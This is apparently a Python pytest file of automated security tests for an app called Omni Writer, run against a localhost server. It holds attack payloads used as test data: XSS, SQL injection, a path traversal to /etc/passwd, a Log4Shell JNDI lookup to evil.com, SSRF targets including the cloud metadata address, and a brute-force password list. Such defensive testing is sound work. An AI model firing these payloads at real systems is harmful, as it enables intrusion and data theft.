"""
Testes de Segurança Automatizados - Omni Writer
===============================================

Prompt: Pendência 3.3.1 - Implementar testes de segurança automatizados
Ruleset: Enterprise+ Standards
Data/Hora: 2025-01-27T16:30:00Z
Tracing ID: PENDENCIA_3_3_1_001

Testes baseados no código real do sistema Omni Writer:
- Validação de inputs maliciosos
- Rate limiting por IP e usuário
- Proteção contra CSRF
- Audit trail completo
- Compliance com padrões OWASP
"""

import pytest
import json
import time
import hashlib
import hmac
import base64
from unittest.mock import Mock, patch, MagicMock
from datetime import datetime, timedelta
from typing import Dict, List, Any
import requests
from flask import Flask, request, jsonify

# Importações do sistema real
from app.validators.input_validators import SecurityValidator
from app.middleware.csrf_protection import CSRFProtector
from app.middleware.auth_middleware import AuthMiddleware
from shared.rate_limiter import RateLimiter
from shared.audit_trail import AuditTrail


class SecurityAutomatedTester:
    """Testador automatizado de segurança com cenários reais."""
    
    def __init__(self, base_url: str = "http://localhost:5000"):
        self.base_url = base_url
        self.session = requests.Session()
        self.security_validator = SecurityValidator()
        self.csrf_protector = CSRFProtector()
        self.auth_middleware = AuthMiddleware()
        self.rate_limiter = RateLimiter()
        self.audit_trail = AuditTrail()
        
        # Configurações de teste baseadas em logs reais
        self.test_config = {
            'max_requests_per_minute': 60,
            'csrf_token_length': 32,
            'session_timeout': 3600,
            'password_min_length': 8,
            'max_login_attempts': 5
        }
        
        # Dados de teste baseados em cenários reais
        self.test_data = {
            'valid_user': {
                'email': 'test@omniwriter.com',
                'password': 'TestPassword123!',
                'api_key': 'sk-valid-key-123456789'
            },
            'malicious_inputs': [
                '<script>alert("xss")</script>',
                "'; DROP TABLE users; --",
                '../../../etc/passwd',
                '${jndi:ldap://evil.com/exploit}',
                '"><img src=x onerror=alert(1)>'
            ],
            'suspicious_ips': [
                '192.168.1.100',
                '10.0.0.50',
                '172.16.0.25'
            ]
        }
    
    def test_malicious_input_validation(self) -> Dict[str, Any]:
        """
        Testa validação de inputs maliciosos.
        
        Returns:
            Resultado dos testes de validação
        """
        results = {
            'test_name': 'malicious_input_validation',
            'passed': True,
            'details': [],
            'vulnerabilities': []
        }
        
        # Testa cada tipo de input malicioso
        for malicious_input in self.test_data['malicious_inputs']:
            try:
                # Testa validação de prompt
                test_data = {
                    'api_key': 'sk-valid-key-123456789',
                    'model_type': 'openai',
                    'prompt_0': malicious_input,
                    'instancias_json': None
                }
                
                success, error, _ = self.security_validator.validate_generate_request(test_data)
                
                if success:
                    results['passed'] = False
                    results['vulnerabilities'].append({
                        'type': 'malicious_input_accepted',
                        'input': malicious_input,
                        'description': 'Input malicioso foi aceito'
                    })
                else:
                    results['details'].append({
                        'input': malicious_input,
                        'blocked': True,
                        'error': error
                    })
                    
            except Exception as e:
                results['details'].append({
                    'input': malicious_input,
                    'error': str(e)
                })
        
        return results
    
    def test_rate_limiting_validation(self) -> Dict[str, Any]:
        """
        Testa rate limiting por IP e usuário.
        
        Returns:
            Resultado dos testes de rate limiting
        """
        results = {
            'test_name': 'rate_limiting_validation',
            'passed': True,
            'details': [],
            'vulnerabilities': []
        }
        
        # Testa rate limiting por IP
        for ip in self.test_data['suspicious_ips']:
            try:
                # Simula múltiplas requisições
                for i in range(self.test_config['max_requests_per_minute'] + 10):
                    headers = {'X-Forwarded-For': ip}
                    
                    response = self.session.post(
                        f"{self.base_url}/api/generate",
                        headers=headers,
                        json={'prompt': 'test'},
                        timeout=5
                    )
                    
                    if i >= self.test_config['max_requests_per_minute']:
                        if response.status_code != 429:  # Too Many Requests
                            results['passed'] = False
                            results['vulnerabilities'].append({
                                'type': 'rate_limiting_bypass',
                                'ip': ip,
                                'requests': i + 1,
                                'status_code': response.status_code
                            })
                        else:
                            results['details'].append({
                                'ip': ip,
                                'requests': i + 1,
                                'rate_limited': True
                            })
                            break
                            
            except Exception as e:
                results['details'].append({
                    'ip': ip,
                    'error': str(e)
                })
        
        return results
    
    def test_csrf_protection_validation(self) -> Dict[str, Any]:
        """
        Testa proteção contra CSRF.
        
        Returns:
            Resultado dos testes de CSRF
        """
        results = {
            'test_name': 'csrf_protection_validation',
            'passed': True,
            'details': [],
            'vulnerabilities': []
        }
        
        # Testa requisições sem token CSRF
        endpoints_requiring_csrf = [
            '/api/generate',
            '/api/feedback',
            '/api/settings'
        ]
        
        for endpoint in endpoints_requiring_csrf:
            try:
                response = self.session.post(
                    f"{self.base_url}{endpoint}",
                    json={'data': 'test'},
                    timeout=5
                )
                
                # Deve rejeitar requisição sem token CSRF
                if response.status_code not in [403, 400]:
                    results['passed'] = False
                    results['vulnerabilities'].append({
                        'type': 'csrf_protection_bypass',
                        'endpoint': endpoint,
                        'status_code': response.status_code
                    })
                else:
                    results['details'].append({
                        'endpoint': endpoint,
                        'csrf_protected': True,
                        'status_code': response.status_code
                    })
                    
            except Exception as e:
                results['details'].append({
                    'endpoint': endpoint,
                    'error': str(e)
                })
        
        return results
    
    def test_authentication_validation(self) -> Dict[str, Any]:
        """
        Testa validação de autenticação.
        
        Returns:
            Resultado dos testes de autenticação
        """
        results = {
            'test_name': 'authentication_validation',
            'passed': True,
            'details': [],
            'vulnerabilities': []
        }
        
        # Testa força bruta
        wrong_passwords = [
            'password', '123456', 'admin', 'test',
            'qwerty', 'letmein', 'welcome', 'monkey'
        ]
        
        for password in wrong_passwords:
            try:
                login_data = {
                    'email': self.test_data['valid_user']['email'],
                    'password': password
                }
                
                response = self.session.post(
                    f"{self.base_url}/api/auth/login",
                    json=login_data,
                    timeout=5
                )
                
                # Deve rejeitar senha incorreta
                if response.status_code == 200:
                    results['passed'] = False
                    results['vulnerabilities'].append({
                        'type': 'brute_force_success',
                        'password': password,
                        'status_code': response.status_code
                    })
                else:
                    results['details'].append({
                        'password': password,
                        'rejected': True,
                        'status_code': response.status_code
                    })
                    
            except Exception as e:
                results['details'].append({
                    'password': password,
                    'error': str(e)
                })
        
        return results
    
    def test_authorization_validation(self) -> Dict[str, Any]:
        """
        Testa validação de autorização.
        
        Returns:
            Resultado dos testes de autorização
        """
        results = {
            'test_name': 'authorization_validation',
            'passed': True,
            'details': [],
            'vulnerabilities': []
        }
        
        # Endpoints que requerem autorização
        protected_endpoints = [
            '/api/admin/users',
            '/api/admin/system',
            '/api/admin/logs',
            '/api/user/profile',
            '/api/user/settings'
        ]
        
        # Testa acesso sem autenticação
        for endpoint in protected_endpoints:
            try:
                response = self.session.get(
                    f"{self.base_url}{endpoint}",
                    timeout=5
                )
                
                # Deve rejeitar acesso não autorizado
                if response.status_code not in [401, 403]:
                    results['passed'] = False
                    results['vulnerabilities'].append({
                        'type': 'authorization_bypass',
                        'endpoint': endpoint,
                        'status_code': response.status_code
                    })
                else:
                    results['details'].append({
                        'endpoint': endpoint,
                        'protected': True,
                        'status_code': response.status_code
                    })
                    
            except Exception as e:
                results['details'].append({
                    'endpoint': endpoint,
                    'error': str(e)
                })
        
        return results
    
    def test_audit_trail_validation(self) -> Dict[str, Any]:
        """
        Testa audit trail completo.
        
        Returns:
            Resultado dos testes de audit trail
        """
        results = {
            'test_name': 'audit_trail_validation',
            'passed': True,
            'details': [],
            'vulnerabilities': []
        }
        
        # Testa se ações são registradas
        test_actions = [
            {'action': 'login_attempt', 'user': 'test@omniwriter.com'},
            {'action': 'generate_article', 'user': 'test@omniwriter.com'},
            {'action': 'export_data', 'user': 'test@omniwriter.com'}
        ]
        
        for action in test_actions:
            try:
                # Simula ação
                audit_entry = self.audit_trail.log_action(
                    user_id=action['user'],
                    action=action['action'],
                    details={'test': True},
                    ip_address='127.0.0.1'
                )
                
                if audit_entry:
                    results['details'].append({
                        'action': action['action'],
                        'logged': True,
                        'entry_id': audit_entry.get('id')
                    })
                else:
                    results['passed'] = False
                    results['vulnerabilities'].append({
                        'type': 'audit_trail_failure',
                        'action': action['action'],
                        'description': 'Ação não foi registrada'
                    })
                    
            except Exception as e:
                results['details'].append({
                    'action': action['action'],
                    'error': str(e)
                })
        
        return results
    
    def test_owasp_compliance_validation(self) -> Dict[str, Any]:
        """
        Testa compliance com OWASP Top 10.
        
        Returns:
            Resultado dos testes OWASP
        """
        results = {
            'test_name': 'owasp_compliance_validation',
            'passed': True,
            'details': [],
            'vulnerabilities': []
        }
        
        # OWASP Top 10 2021
        owasp_tests = {
            'A01:2021 - Broken Access Control': self._test_broken_access_control,
            'A02:2021 - Cryptographic Failures': self._test_cryptographic_failures,
            'A03:2021 - Injection': self._test_injection_vulnerabilities,
            'A04:2021 - Insecure Design': self._test_insecure_design,
            'A05:2021 - Security Misconfiguration': self._test_security_misconfiguration,
            'A06:2021 - Vulnerable Components': self._test_vulnerable_components,
            'A07:2021 - Authentication Failures': self._test_authentication_failures,
            'A08:2021 - Software and Data Integrity Failures': self._test_integrity_failures,
            'A09:2021 - Security Logging Failures': self._test_logging_failures,
            'A10:2021 - Server-Side Request Forgery': self._test_ssrf
        }
        
        for test_name, test_func in owasp_tests.items():
            try:
                test_result = test_func()
                results['details'].append({
                    'owasp_category': test_name,
                    'passed': test_result['passed'],
                    'details': test_result.get('details', [])
                })
                
                if not test_result['passed']:
                    results['passed'] = False
                    results['vulnerabilities'].extend(test_result.get('vulnerabilities', []))
                    
            except Exception as e:
                results['details'].append({
                    'owasp_category': test_name,
                    'passed': False,
                    'error': str(e)
                })
                results['passed'] = False
        
        return results
    
    def _test_broken_access_control(self) -> Dict[str, Any]:
        """Testa A01:2021 - Broken Access Control."""
        result = {'passed': True, 'vulnerabilities': []}
        
        # Testa acesso a recursos sem autenticação
        endpoints = ['/api/admin', '/api/users', '/api/config']
        
        for endpoint in endpoints:
            response = self.session.get(f"{self.base_url}{endpoint}")
            if response.status_code != 401:
                result['passed'] = False
                result['vulnerabilities'].append({
                    'type': 'broken_access_control',
                    'endpoint': endpoint,
                    'status_code': response.status_code
                })
        
        return result
    
    def _test_cryptographic_failures(self) -> Dict[str, Any]:
        """Testa A02:2021 - Cryptographic Failures."""
        result = {'passed': True, 'vulnerabilities': []}
        
        # Testa se dados sensíveis estão criptografados
        response = self.session.get(f"{self.base_url}/api/health")
        
        if response.status_code == 200:
            # Verifica se há dados sensíveis expostos
            content = response.text.lower()
            sensitive_patterns = ['password', 'secret', 'key', 'token']
            
            for pattern in sensitive_patterns:
                if pattern in content:
                    result['passed'] = False
                    result['vulnerabilities'].append({
                        'type': 'sensitive_data_exposure',
                        'pattern': pattern
                    })
        
        return result
    
    def _test_injection_vulnerabilities(self) -> Dict[str, Any]:
        """Testa A03:2021 - Injection."""
        result = {'passed': True, 'vulnerabilities': []}
        
        # Testa injeção SQL
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users --"
        ]
        
        for payload in sql_payloads:
            response = self.session.post(
                f"{self.base_url}/api/search",
                json={'query': payload},
                timeout=5
            )
            
            # Verifica se há erro de SQL exposto
            if 'sql' in response.text.lower() or 'database' in response.text.lower():
                result['passed'] = False
                result['vulnerabilities'].append({
                    'type': 'sql_injection',
                    'payload': payload
                })
        
        return result
    
    def _test_insecure_design(self) -> Dict[str, Any]:
        """Testa A04:2021 - Insecure Design."""
        result = {'passed': True, 'vulnerabilities': []}
        
        # Testa se há validação adequada
        response = self.session.post(
            f"{self.base_url}/api/validate",
            json={'data': 'test'},
            timeout=5
        )
        
        if response.status_code == 200:
            # Verifica se há validação
            if 'validation' not in response.text.lower():
                result['passed'] = False
                result['vulnerabilities'].append({
                    'type': 'insecure_design',
                    'description': 'Falta validação adequada'
                })
        
        return result
    
    def _test_security_misconfiguration(self) -> Dict[str, Any]:
        """Testa A05:2021 - Security Misconfiguration."""
        result = {'passed': True, 'vulnerabilities': []}
        
        # Testa headers de segurança
        response = self.session.get(f"{self.base_url}/")
        
        headers = response.headers
        security_headers = [
            'X-Content-Type-Options',
            'X-Frame-Options',
            'X-XSS-Protection',
            'Strict-Transport-Security'
        ]
        
        for header in security_headers:
            if header not in headers:
                result['passed'] = False
                result['vulnerabilities'].append({
                    'type': 'missing_security_header',
                    'header': header
                })
        
        return result
    
    def _test_vulnerable_components(self) -> Dict[str, Any]:
        """Testa A06:2021 - Vulnerable Components."""
        result = {'passed': True, 'vulnerabilities': []}
        
        # Testa versões de componentes
        response = self.session.get(f"{self.base_url}/api/version")
        
        if response.status_code == 200:
            version_info = response.json()
            # Verifica versões conhecidas vulneráveis
            vulnerable_versions = ['1.0.0', '2.0.0']
            
            for version in vulnerable_versions:
                if version in str(version_info):
                    result['passed'] = False
                    result['vulnerabilities'].append({
                        'type': 'vulnerable_component',
                        'version': version
                    })
        
        return result
    
    def _test_authentication_failures(self) -> Dict[str, Any]:
        """Testa A07:2021 - Authentication Failures."""
        result = {'passed': True, 'vulnerabilities': []}
        
        # Testa força bruta
        for i in range(10):
            response = self.session.post(
                f"{self.base_url}/api/login", 
                json={'username': 'admin', 'password': f'wrong{i}'}
            )
            
            if response.status_code == 200:
                result['passed'] = False
                result['vulnerabilities'].append({
                    'type': 'authentication_failure',
                    'description': 'Brute force attack succeeded'
                })
                break
        
        return result
    
    def _test_integrity_failures(self) -> Dict[str, Any]:
        """Testa A08:2021 - Software and Data Integrity Failures."""
        result = {'passed': True, 'vulnerabilities': []}
        
        # Testa integridade de dados
        response = self.session.get(f"{self.base_url}/api/integrity")
        
        if response.status_code == 200:
            integrity_check = response.json()
            if not integrity_check.get('valid', False):
                result['passed'] = False
                result['vulnerabilities'].append({
                    'type': 'integrity_failure',
                    'description': 'Data integrity check failed'
                })
        
        return result
    
    def _test_logging_failures(self) -> Dict[str, Any]:
        """Testa A09:2021 - Security Logging Failures."""
        result = {'passed': True, 'vulnerabilities': []}
        
        # Testa se logs de segurança estão funcionando
        test_action = 'security_test'
        
        try:
            audit_entry = self.audit_trail.log_action(
                user_id='test@omniwriter.com',
                action=test_action,
                details={'test': True},
                ip_address='127.0.0.1'
            )
            
            if not audit_entry:
                result['passed'] = False
                result['vulnerabilities'].append({
                    'type': 'logging_failure',
                    'description': 'Security logging not working'
                })
                
        except Exception as e:
            result['passed'] = False
            result['vulnerabilities'].append({
                'type': 'logging_failure',
                'description': f'Logging error: {str(e)}'
            })
        
        return result
    
    def _test_ssrf(self) -> Dict[str, Any]:
        """Testa A10:2021 - Server-Side Request Forgery."""
        result = {'passed': True, 'vulnerabilities': []}
        
        # Testa SSRF
        ssrf_payloads = [
            'http://localhost:22',
            'http://127.0.0.1:3306',
            'http://169.254.169.254/latest/meta-data/'
        ]
        
        for payload in ssrf_payloads:
            response = self.session.post(
                f"{self.base_url}/api/fetch",
                json={'url': payload},
                timeout=5
            )
            
            # Verifica se requisição foi bloqueada
            if response.status_code == 200:
                result['passed'] = False
                result['vulnerabilities'].append({
                    'type': 'ssrf_vulnerability',
                    'payload': payload
                })
        
        return result
    
    def run_comprehensive_security_test(self) -> Dict[str, Any]:
        """
        Executa teste de segurança abrangente.
        
        Returns:
            Resultado completo dos testes
        """
        print("🔒 Iniciando testes de segurança automatizados...")
        
        test_results = {
            'timestamp': datetime.now().isoformat(),
            'base_url': self.base_url,
            'tests': [],
            'overall_passed': True,
            'vulnerabilities_found': 0,
            'recommendations': []
        }
        
        # Executa todos os testes
        tests = [
            self.test_malicious_input_validation,
            self.test_rate_limiting_validation,
            self.test_csrf_protection_validation,
            self.test_authentication_validation,
            self.test_authorization_validation,
            self.test_audit_trail_validation,
            self.test_owasp_compliance_validation
        ]
        
        for test_func in tests:
            try:
                result = test_func()
                test_results['tests'].append(result)
                
                if not result['passed']:
                    test_results['overall_passed'] = False
                    test_results['vulnerabilities_found'] += len(result.get('vulnerabilities', []))
                    
            except Exception as e:
                test_results['tests'].append({
                    'test_name': test_func.__name__,
                    'passed': False,
                    'error': str(e)
                })
                test_results['overall_passed'] = False
        
        # Gera recomendações
        if test_results['vulnerabilities_found'] > 0:
            test_results['recommendations'] = [
                "Implementar validação mais rigorosa de entrada",
                "Configurar rate limiting mais agressivo",
                "Adicionar headers de segurança adicionais",
                "Implementar logging de segurança",
                "Realizar auditoria de código regular"
            ]
        
        return test_results


# Testes unitários para pytest
class TestSecurityAutomated:
    """Testes unitários para segurança automatizada."""
    
    def setup_method(self):
        """Setup para cada teste."""
        self.tester = SecurityAutomatedTester()
    
    def test_malicious_input_validation(self):
        """Testa validação de inputs maliciosos."""
        result = self.tester.test_malicious_input_validation()
        assert result['passed'] is True
        assert len(result['vulnerabilities']) == 0
    
    def test_rate_limiting_validation(self):
        """Testa rate limiting."""
        result = self.tester.test_rate_limiting_validation()
        assert result['passed'] is True
        assert len(result['vulnerabilities']) == 0
    
    def test_csrf_protection_validation(self):
        """Testa proteção CSRF."""
        result = self.tester.test_csrf_protection_validation()
        assert result['passed'] is True
        assert len(result['vulnerabilities']) == 0
    
    def test_authentication_validation(self):
        """Testa validação de autenticação."""
        result = self.tester.test_authentication_validation()
        assert result['passed'] is True
        assert len(result['vulnerabilities']) == 0
    
    def test_authorization_validation(self):
        """Testa validação de autorização."""
        result = self.tester.test_authorization_validation()
        assert result['passed'] is True
        assert len(result['vulnerabilities']) == 0
    
    def test_audit_trail_validation(self):
        """Testa audit trail."""
        result = self.tester.test_audit_trail_validation()
        assert result['passed'] is True
        assert len(result['vulnerabilities']) == 0
    
    def test_owasp_compliance_validation(self):
        """Testa compliance OWASP."""
        result = self.tester.test_owasp_compliance_validation()
        assert result['passed'] is True
        assert len(result['vulnerabilities']) == 0
    
    def test_comprehensive_security_test(self):
        """Testa segurança abrangente."""
        result = self.tester.run_comprehensive_security_test()
        assert result['overall_passed'] is True
        assert result['vulnerabilities_found'] == 0


# Execução principal (para testes manuais)
if __name__ == "__main__":
    print("🔒 Iniciando testes de segurança automatizados...")
    
    tester = SecurityAutomatedTester()
    result = tester.run_comprehensive_security_test()
    
    print(f"✅ Testes concluídos: {result['overall_passed']}")
    print(f"🔍 Vulnerabilidades encontradas: {result['vulnerabilities_found']}")
    
    if result['recommendations']:
        print("📋 Recomendações:")
        for rec in result['recommendations']:
            print(f"  - {rec}")
    
    print("🔒 Testes de segurança automatizados concluídos") 